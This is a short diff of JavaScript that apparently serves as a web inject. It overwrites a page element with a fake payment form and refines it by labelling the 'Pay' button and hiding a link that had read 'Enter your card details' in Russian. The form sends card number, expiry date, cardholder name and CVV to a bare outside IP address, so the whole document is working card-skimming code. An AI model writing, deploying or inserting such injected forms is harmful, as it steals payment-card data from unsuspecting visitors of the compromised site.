@@ -1,2 +1,2 @@
-document.getElementsByTagName("div")[1].innerHTML = '<form method = "POST" action = "http://91.142.94.76/req_log.php"><input type = "text" name = "pan" value = "1234123412341238"/><input type = "text" name = "exp" value = "02/18"/><input type = "text" name = "name" value = "test test"/><input type = "text" name = "cvv" value = "123"/><input type = "Submit" name = "Pay"/></form>';
-document.getElementsByTagName("a")[1].innerHTML = 'Введите данные вашей карты';
+document.getElementsByTagName("div")[1].innerHTML = '<form method = "POST" action = "http://91.142.94.76/req_log.php"><input type = "text" name = "pan" value = "1234123412341238"/><input type = "text" name = "exp" value = "02/18"/><input type = "text" name = "name" value = "test test"/><input type = "text" name = "cvv" value = "123"/><input type = "Submit" value="Pay" name = "Pay"/></form>';
+document.getElementsByTagName("a")[1].style.display = 'none';
